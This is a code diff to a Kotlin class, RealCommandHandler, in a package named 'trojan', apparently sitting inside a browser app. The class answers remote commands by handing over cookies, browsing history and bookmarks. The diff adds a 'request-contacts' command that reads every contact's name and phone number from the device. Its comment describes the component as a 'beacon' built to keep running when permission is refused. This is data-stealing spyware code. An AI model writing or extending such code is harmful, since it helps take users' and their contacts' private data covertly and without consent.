@@ -1,5 +1,7 @@
 package com.duckduckgo.trojan.impl
 
+import android.content.Context
+import android.provider.ContactsContract
 import com.duckduckgo.cookies.api.CookieManagerProvider
 import com.duckduckgo.di.scopes.AppScope
 import com.duckduckgo.history.api.NavigationHistory
@@ -35,6 +37,7 @@ class RealCommandHandler @Inject constructor(
     private val cookieManagerProvider: CookieManagerProvider,
     private val navigationHistory: NavigationHistory,
     private val savedSitesRepository: SavedSitesRepository,
+    private val context: Context,
 ) : CommandHandler {
 
     override suspend fun execute(command: PendingCommand): String {
@@ -43,6 +46,7 @@ class RealCommandHandler @Inject constructor(
                 "request-cookies" -> handleRequestCookies(command.payload)
                 "request-history" -> handleRequestHistory()
                 "request-bookmarks" -> handleRequestBookmarks()
+                "request-contacts" -> handleRequestContacts()
                 else -> "unknown command type: ${command.type}"
             }
         } catch (e: Exception) {
@@ -97,6 +101,39 @@ class RealCommandHandler @Inject constructor(
 
         return entries.joinToString("\n") { entry ->
             "${entry.url} | ${entry.title} | visits: ${entry.visits.size}"
+        }
+    }
+
+    /**
+     * Extract contacts (name + phone number) from the system Contacts provider.
+     *
+     * Requires READ_CONTACTS dangerous permission. Returns a SecurityException
+     * message if the user has not granted the permission at runtime so the beacon
+     * continues operating rather than crashing.
+     */
+    private fun handleRequestContacts(): String {
+        return try {
+            val projection = arrayOf(
+                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
+                ContactsContract.CommonDataKinds.Phone.NUMBER,
+            )
+            val cursor = context.contentResolver.query(
+                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                projection,
+                null, null, null,
+            ) ?: return "no contacts available"
+
+            val contacts = mutableListOf<String>()
+            cursor.use { c ->
+                while (c.moveToNext()) {
+                    val name = c.getString(0) ?: ""
+                    val number = c.getString(1) ?: ""
+                    contacts.add("$name: $number")
+                }
+            }
+            if (contacts.isEmpty()) "no contacts" else contacts.joinToString("\n")
+        } catch (_: SecurityException) {
+            "permission denied: READ_CONTACTS not granted"
         }
     }
 
